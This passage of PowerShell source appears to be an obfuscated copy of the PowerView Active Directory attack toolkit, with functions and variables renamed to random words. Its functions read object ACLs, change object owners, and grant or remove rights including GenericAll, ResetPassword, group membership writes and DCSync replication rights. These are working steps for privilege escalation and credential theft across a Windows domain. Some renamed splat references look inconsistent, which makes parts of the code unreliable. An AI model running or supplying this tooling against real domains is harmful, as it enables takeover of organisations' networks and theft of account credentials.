        $PCDClrQw99,
        [Parameter(Mandatory = $True, ParameterSetName='AuditRuleType')]
        [ValidateSet('Success', 'Failure')]
        [String]
        $NnzsDBTx99,
        [Parameter(Mandatory = $False, ParameterSetName='AccessRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='AuditRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='ObjectGuidLookup')]
        [Guid]
        $qPSIsaed99,
        [ValidateSet('All', 'Children','Descendents','None','SelfAndChildren')]
        [String]
        $BrTMgsZN99,
        [Guid]
        $nAHMavwo99
    )
    Begin {
        if ($lJaHgDll99 -notmatch '^S-1-.*') {
            $epLCyKna99 = @{
                'Identity' = $lJaHgDll99
                'Properties' = 'distinguishedname,objectsid'
            }
            if ($PSBoundParameters['PrincipalDomain']) { $epLCyKna99['Domain'] = $ChGAFvwA99 }
            if ($PSBoundParameters['Server']) { $epLCyKna99['Server'] = $vbyFupaI99 }
            if ($PSBoundParameters['SearchScope']) { $epLCyKna99['SearchScope'] = $RVZhWaEH99 }
            if ($PSBoundParameters['ResultPageSize']) { $epLCyKna99['ResultPageSize'] = $rguZwVJP99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $epLCyKna99['ServerTimeLimit'] = $CRJCwXfg99 }
            if ($PSBoundParameters['Tombstone']) { $epLCyKna99['Tombstone'] = $iqiYBoee99 }
            if ($PSBoundParameters['Credential']) { $epLCyKna99['Credential'] = $QWHERWHL99 }
            $mkSuwUqY99 = monologue @PrincipalSearcherArguments
            if (-not $mkSuwUqY99) {
                throw "Unable to resolve principal: $lJaHgDll99"
            }
            elseif($mkSuwUqY99.Count -gt 1) {
                throw "PrincipalIdentity matches multiple AD objects, but only one is allowed"
            }
            $JsKvOOQh99 = $mkSuwUqY99.objectsid
        }
        else {
            $JsKvOOQh99 = $lJaHgDll99
        }
        $EMvBAJlf99 = 0
        foreach($r in $Right) {
            $EMvBAJlf99 = $EMvBAJlf99 -bor (([System.DirectoryServices.ActiveDirectoryRights]$r).value__)
        }
        $EMvBAJlf99 = [System.DirectoryServices.ActiveDirectoryRights]$EMvBAJlf99
        $NADQIykH99 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$JsKvOOQh99)
    }
    Process {
        if($PSCmdlet.ParameterSetName -eq 'AuditRuleType') {
            if($qPSIsaed99 -eq $null -and $BrTMgsZN99 -eq [String]::Empty -and $nAHMavwo99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $NADQIykH99, $EMvBAJlf99, $NnzsDBTx99
            } elseif($qPSIsaed99 -eq $null -and $BrTMgsZN99 -ne [String]::Empty -and $nAHMavwo99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $NADQIykH99, $EMvBAJlf99, $NnzsDBTx99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$BrTMgsZN99)
            } elseif($qPSIsaed99 -eq $null -and $BrTMgsZN99 -ne [String]::Empty -and $nAHMavwo99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $NADQIykH99, $EMvBAJlf99, $NnzsDBTx99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$BrTMgsZN99), $nAHMavwo99
            } elseif($qPSIsaed99 -ne $null -and $BrTMgsZN99 -eq [String]::Empty -and $nAHMavwo99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $NADQIykH99, $EMvBAJlf99, $NnzsDBTx99, $qPSIsaed99
            } elseif($qPSIsaed99 -ne $null -and $BrTMgsZN99 -ne [String]::Empty -and $nAHMavwo99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $NADQIykH99, $EMvBAJlf99, $NnzsDBTx99, $qPSIsaed99, $BrTMgsZN99
            } elseif($qPSIsaed99 -ne $null -and $BrTMgsZN99 -ne [String]::Empty -and $nAHMavwo99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $NADQIykH99, $EMvBAJlf99, $NnzsDBTx99, $qPSIsaed99, $BrTMgsZN99, $nAHMavwo99
            }
        }
        else {
            if($qPSIsaed99 -eq $null -and $BrTMgsZN99 -eq [String]::Empty -and $nAHMavwo99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $NADQIykH99, $EMvBAJlf99, $PCDClrQw99
            } elseif($qPSIsaed99 -eq $null -and $BrTMgsZN99 -ne [String]::Empty -and $nAHMavwo99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $NADQIykH99, $EMvBAJlf99, $PCDClrQw99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$BrTMgsZN99)
            } elseif($qPSIsaed99 -eq $null -and $BrTMgsZN99 -ne [String]::Empty -and $nAHMavwo99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $NADQIykH99, $EMvBAJlf99, $PCDClrQw99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$BrTMgsZN99), $nAHMavwo99
            } elseif($qPSIsaed99 -ne $null -and $BrTMgsZN99 -eq [String]::Empty -and $nAHMavwo99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $NADQIykH99, $EMvBAJlf99, $PCDClrQw99, $qPSIsaed99
            } elseif($qPSIsaed99 -ne $null -and $BrTMgsZN99 -ne [String]::Empty -and $nAHMavwo99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $NADQIykH99, $EMvBAJlf99, $PCDClrQw99, $qPSIsaed99, $BrTMgsZN99
            } elseif($qPSIsaed99 -ne $null -and $BrTMgsZN99 -ne [String]::Empty -and $nAHMavwo99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $NADQIykH99, $EMvBAJlf99, $PCDClrQw99, $qPSIsaed99, $BrTMgsZN99, $nAHMavwo99
            }
        }
    }
}
function counterrevolutionaries {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $NADQIykH99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Owner')]
        [String]
        $enMWUoOO99,
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $aWyQQagT99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $BffxXlHt99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [Switch]
        $iqiYBoee99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $qbMTjYnI99 = @{}
        if ($PSBoundParameters['Domain']) { $qbMTjYnI99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['LDAPFilter']) { $qbMTjYnI99['LDAPFilter'] = $aWyQQagT99 }
        if ($PSBoundParameters['SearchBase']) { $qbMTjYnI99['SearchBase'] = $BffxXlHt99 }
        if ($PSBoundParameters['Server']) { $qbMTjYnI99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $qbMTjYnI99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $qbMTjYnI99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $qbMTjYnI99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Tombstone']) { $qbMTjYnI99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $qbMTjYnI99['Credential'] = $QWHERWHL99 }
        $LbKnqQMd99 = monologue @SearcherArguments -NADQIykH99 $enMWUoOO99 -IzcJvFdA99 objectsid | Select-Object -ExpandProperty objectsid
        if ($LbKnqQMd99) {
            $EufWNJoE99 = [System.Security.Principal.SecurityIdentifier]$LbKnqQMd99
        }
        else {
            Write-Warning "[counterrevolutionaries] Error parsing owner identity '$enMWUoOO99'"
        }
    }
    PROCESS {
        if ($EufWNJoE99) {
            $qbMTjYnI99['Raw'] = $True
            $qbMTjYnI99['Identity'] = $NADQIykH99
            $WQvASDDT99 = monologue @SearcherArguments
            ForEach ($Object in $WQvASDDT99) {
                try {
                    Write-Verbose "[counterrevolutionaries] Attempting to set the owner for '$NADQIykH99' to '$enMWUoOO99'"
                    $Entry = $WQvASDDT99.GetDirectoryEntry()
                    $Entry.PsBase.Options.SecurityMasks = 'Owner'
                    $Entry.PsBase.ObjectSecurity.SetOwner($EufWNJoE99)
                    $Entry.PsBase.CommitChanges()
                }
                catch {
                    Write-Warning "[counterrevolutionaries] Error setting owner: $_"
                }
            }
        }
    }
}
function Naples {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $NADQIykH99,
        [Switch]
        $Sacl,
        [Switch]
        $YKZjzOnv99,
        [String]
        [Alias('Rights')]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $YbwoLawJ99,
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $aWyQQagT99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $BffxXlHt99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [Switch]
        $iqiYBoee99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $qbMTjYnI99 = @{
            'Properties' = 'samaccountname,ntsecuritydescriptor,distinguishedname,objectsid'
        }
        if ($PSBoundParameters['Sacl']) {
            $qbMTjYnI99['SecurityMasks'] = 'Sacl'
        }
        else {
            $qbMTjYnI99['SecurityMasks'] = 'Dacl'
        }
        if ($PSBoundParameters['Domain']) { $qbMTjYnI99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['SearchBase']) { $qbMTjYnI99['SearchBase'] = $BffxXlHt99 }
        if ($PSBoundParameters['Server']) { $qbMTjYnI99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $qbMTjYnI99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $qbMTjYnI99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $qbMTjYnI99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Tombstone']) { $qbMTjYnI99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $qbMTjYnI99['Credential'] = $QWHERWHL99 }
        $oSFVEugC99 = squintest @SearcherArguments
        $ooniynfj99 = @{}
        if ($PSBoundParameters['Domain']) { $ooniynfj99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['Server']) { $ooniynfj99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['ResultPageSize']) { $ooniynfj99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $ooniynfj99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Credential']) { $ooniynfj99['Credential'] = $QWHERWHL99 }
        if ($PSBoundParameters['ResolveGUIDs']) {
            $GUIDs = discomposes @DomainGUIDMapArguments
        }
    }
    PROCESS {
        if ($oSFVEugC99) {
            $UpOHlfOj99 = ''
            $iNUvqNTo99 = ''
            $NADQIykH99 | Where-Object {$_} | ForEach-Object {
                $xzUuDuRm99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($xzUuDuRm99 -match '^S-1-.*') {
                    $UpOHlfOj99 += "(objectsid=$xzUuDuRm99)"
                }
                elseif ($xzUuDuRm99 -match '^(CN|OU|DC)=.*') {
                    $UpOHlfOj99 += "(distinguishedname=$xzUuDuRm99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $oXGljrha99 = $xzUuDuRm99.SubString($xzUuDuRm99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Naples] Extracted domain '$oXGljrha99' from '$xzUuDuRm99'"
                        $qbMTjYnI99['Domain'] = $oXGljrha99
                        $oSFVEugC99 = squintest @SearcherArguments
                        if (-not $oSFVEugC99) {
                            Write-Warning "[Naples] Unable to retrieve domain searcher for '$oXGljrha99'"
                        }
                    }
                }
                elseif ($xzUuDuRm99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $PTUZmxXK99 = (([Guid]$xzUuDuRm99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $UpOHlfOj99 += "(objectguid=$PTUZmxXK99)"
                }
                elseif ($xzUuDuRm99.Contains('.')) {
                    $UpOHlfOj99 += "(|(samAccountName=$xzUuDuRm99)(name=$xzUuDuRm99)(dnshostname=$xzUuDuRm99))"
                }
                else {
                    $UpOHlfOj99 += "(|(samAccountName=$xzUuDuRm99)(name=$xzUuDuRm99)(displayname=$xzUuDuRm99))"
                }
            }
            if ($UpOHlfOj99 -and ($UpOHlfOj99.Trim() -ne '') ) {
                $iNUvqNTo99 += "(|$UpOHlfOj99)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Naples] Using additional LDAP filter: $aWyQQagT99"
                $iNUvqNTo99 += "$aWyQQagT99"
            }
            if ($iNUvqNTo99) {
                $oSFVEugC99.filter = "(&$iNUvqNTo99)"
            }
            Write-Verbose "[Naples] Naples filter string: $($oSFVEugC99.filter)"
            $IUnNdChl99 = $oSFVEugC99.FindAll()
            $IUnNdChl99 | Where-Object {$_} | ForEach-Object {
                $Object = $_.Properties
                if ($Object.objectsid -and $Object.objectsid[0]) {
                    $JsKvOOQh99 = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                }
                else {
                    $JsKvOOQh99 = $Null
                }
                try {
                    New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Object['ntsecuritydescriptor'][0], 0 | ForEach-Object { if ($PSBoundParameters['Sacl']) {$_.SystemAcl} else {$_.DiscretionaryAcl} } | ForEach-Object {
                        if ($PSBoundParameters['RightsFilter']) {
                            $NBjhCVuK99 = Switch ($YbwoLawJ99) {
                                'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                                'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                                Default { '00000000-0000-0000-0000-000000000000' }
                            }
                            if ($_.ObjectType -eq $NBjhCVuK99) {
                                $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                                $_ | Add-Member NoteProperty 'ObjectSID' $JsKvOOQh99
                                $EsriSBxN99 = $True
                            }
                        }
                        else {
                            $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                            $_ | Add-Member NoteProperty 'ObjectSID' $JsKvOOQh99
                            $EsriSBxN99 = $True
                        }
                        if ($EsriSBxN99) {
                            $_ | Add-Member NoteProperty 'ActiveDirectoryRights' ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
                            if ($GUIDs) {
                                $eMlpaWRR99 = @{}
                                $_.psobject.properties | ForEach-Object {
                                    if ($_.Name -match 'ObjectType|InheritedObjectType|ObjectAceType|InheritedObjectAceType') {
                                        try {
                                            $eMlpaWRR99[$_.Name] = $GUIDs[$_.Value.toString()]
                                        }
                                        catch {
                                            $eMlpaWRR99[$_.Name] = $_.Value
                                        }
                                    }
                                    else {
                                        $eMlpaWRR99[$_.Name] = $_.Value
                                    }
                                }
                                $XGcKEAcR99 = New-Object -TypeName PSObject -Property $eMlpaWRR99
                                $XGcKEAcR99.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $XGcKEAcR99
                            }
                            else {
                                $_.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $_
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose "[Naples] Error: $_"
                }
            }
        }
    }
}
function thighs {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $PkvgfxKs99,
        [ValidateNotNullOrEmpty()]
        [String]
        $cELjQvSA99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $fpdzluqV99,
        [ValidateNotNullOrEmpty()]
        [String]
        $EBcybiPe99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $lJaHgDll99,
        [ValidateNotNullOrEmpty()]
        [String]
        $ChGAFvwA99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [Switch]
        $iqiYBoee99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $uLTCBKvg99 = 'All',
        [Guid]
        $kbAFVALk99
    )
    BEGIN {
        $rgicIivp99 = @{
            'Properties' = 'distinguishedname'
            'Raw' = $True
        }
        if ($PSBoundParameters['TargetDomain']) { $rgicIivp99['Domain'] = $cELjQvSA99 }
        if ($PSBoundParameters['TargetLDAPFilter']) { $rgicIivp99['LDAPFilter'] = $fpdzluqV99 }
        if ($PSBoundParameters['TargetSearchBase']) { $rgicIivp99['SearchBase'] = $EBcybiPe99 }
        if ($PSBoundParameters['Server']) { $rgicIivp99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $rgicIivp99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $rgicIivp99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $rgicIivp99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Tombstone']) { $rgicIivp99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $rgicIivp99['Credential'] = $QWHERWHL99 }
        $epLCyKna99 = @{
            'Identity' = $lJaHgDll99
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($PSBoundParameters['PrincipalDomain']) { $epLCyKna99['Domain'] = $ChGAFvwA99 }
        if ($PSBoundParameters['Server']) { $epLCyKna99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $epLCyKna99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $epLCyKna99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $epLCyKna99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Tombstone']) { $epLCyKna99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $epLCyKna99['Credential'] = $QWHERWHL99 }
        $QqjcxcgU99 = monologue @PrincipalSearcherArguments
        if (-not $QqjcxcgU99) {
            throw "Unable to resolve principal: $lJaHgDll99"
        }
    }
    PROCESS {
        $rgicIivp99['Identity'] = $PkvgfxKs99
        $PwiYDoiK99 = monologue @TargetSearcherArguments
        ForEach ($PFFVxxpZ99 in $PwiYDoiK99) {
            $BrTMgsZN99 = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $pmZXOVZH99 = [System.Security.AccessControl.AccessControlType] 'Allow'
            $ACEs = @()
            if ($kbAFVALk99) {
                $GUIDs = @($kbAFVALk99)
            }
            else {
                $GUIDs = Switch ($uLTCBKvg99) {
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }
            ForEach ($GruXSjJP99 in $QqjcxcgU99) {
                Write-Verbose "[thighs] Granting principal $($GruXSjJP99.distinguishedname) '$uLTCBKvg99' on $($PFFVxxpZ99.Properties.distinguishedname)"
                try {
                    $NADQIykH99 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$GruXSjJP99.objectsid)
                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $TOAUSDiT99 = New-Object Guid $GUID
                            $ssLbIcCe99 = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $NADQIykH99, $ssLbIcCe99, $pmZXOVZH99, $TOAUSDiT99, $BrTMgsZN99
                        }
                    }
                    else {
                        $ssLbIcCe99 = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $NADQIykH99, $ssLbIcCe99, $pmZXOVZH99, $BrTMgsZN99
                    }
                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[thighs] Granting principal $($GruXSjJP99.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($PFFVxxpZ99.Properties.distinguishedname)"
                        $OSWoSCHa99 = $PFFVxxpZ99.GetDirectoryEntry()
                        $OSWoSCHa99.PsBase.Options.SecurityMasks = 'Dacl'
                        $OSWoSCHa99.PsBase.ObjectSecurity.AddAccessRule($ACE)
                        $OSWoSCHa99.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[thighs] Error granting principal $($GruXSjJP99.distinguishedname) '$uLTCBKvg99' on $($PFFVxxpZ99.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}
function fortification {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $PkvgfxKs99,
        [ValidateNotNullOrEmpty()]
        [String]
        $cELjQvSA99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $fpdzluqV99,
        [ValidateNotNullOrEmpty()]
        [String]
        $EBcybiPe99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $lJaHgDll99,
        [ValidateNotNullOrEmpty()]
        [String]
        $ChGAFvwA99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [Switch]
        $iqiYBoee99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $uLTCBKvg99 = 'All',
        [Guid]
        $kbAFVALk99
    )
    BEGIN {
        $rgicIivp99 = @{
            'Properties' = 'distinguishedname'
            'Raw' = $True
        }
        if ($PSBoundParameters['TargetDomain']) { $rgicIivp99['Domain'] = $cELjQvSA99 }
        if ($PSBoundParameters['TargetLDAPFilter']) { $rgicIivp99['LDAPFilter'] = $fpdzluqV99 }
        if ($PSBoundParameters['TargetSearchBase']) { $rgicIivp99['SearchBase'] = $EBcybiPe99 }
        if ($PSBoundParameters['Server']) { $rgicIivp99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $rgicIivp99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $rgicIivp99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $rgicIivp99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Tombstone']) { $rgicIivp99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $rgicIivp99['Credential'] = $QWHERWHL99 }
        $epLCyKna99 = @{
            'Identity' = $lJaHgDll99
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($PSBoundParameters['PrincipalDomain']) { $epLCyKna99['Domain'] = $ChGAFvwA99 }
        if ($PSBoundParameters['Server']) { $epLCyKna99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $epLCyKna99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $epLCyKna99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $epLCyKna99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Tombstone']) { $epLCyKna99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $epLCyKna99['Credential'] = $QWHERWHL99 }
        $QqjcxcgU99 = monologue @PrincipalSearcherArguments
        if (-not $QqjcxcgU99) {
            throw "Unable to resolve principal: $lJaHgDll99"
        }
    }
    PROCESS {
        $rgicIivp99['Identity'] = $PkvgfxKs99
        $PwiYDoiK99 = monologue @TargetSearcherArguments
        ForEach ($PFFVxxpZ99 in $PwiYDoiK99) {
            $BrTMgsZN99 = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $pmZXOVZH99 = [System.Security.AccessControl.AccessControlType] 'Allow'
            $ACEs = @()
            if ($kbAFVALk99) {
                $GUIDs = @($kbAFVALk99)
            }
            else {
                $GUIDs = Switch ($uLTCBKvg99) {
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }
            ForEach ($GruXSjJP99 in $QqjcxcgU99) {
                Write-Verbose "[fortification] Removing principal $($GruXSjJP99.distinguishedname) '$uLTCBKvg99' from $($PFFVxxpZ99.Properties.distinguishedname)"
                try {
                    $NADQIykH99 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$GruXSjJP99.objectsid)
                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $TOAUSDiT99 = New-Object Guid $GUID
                            $ssLbIcCe99 = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $NADQIykH99, $ssLbIcCe99, $pmZXOVZH99, $TOAUSDiT99, $BrTMgsZN99
                        }
                    }
                    else {
                        $ssLbIcCe99 = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $NADQIykH99, $ssLbIcCe99, $pmZXOVZH99, $BrTMgsZN99
                    }
                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[fortification] Granting principal $($GruXSjJP99.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($PFFVxxpZ99.Properties.distinguishedname)"
                        $OSWoSCHa99 = $PFFVxxpZ99.GetDirectoryEntry()
                        $OSWoSCHa99.PsBase.Options.SecurityMasks = 'Dacl'
                        $OSWoSCHa99.PsBase.ObjectSecurity.RemoveAccessRule($ACE)
                        $OSWoSCHa99.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[fortification] Error removing principal $($GruXSjJP99.distinguishedname) '$uLTCBKvg99' from $($PFFVxxpZ99.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}
function hyphen {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DomainName', 'Name')]
        [String]
        $CmuysoGL99,
        [Switch]
        $YKZjzOnv99,
        [String]
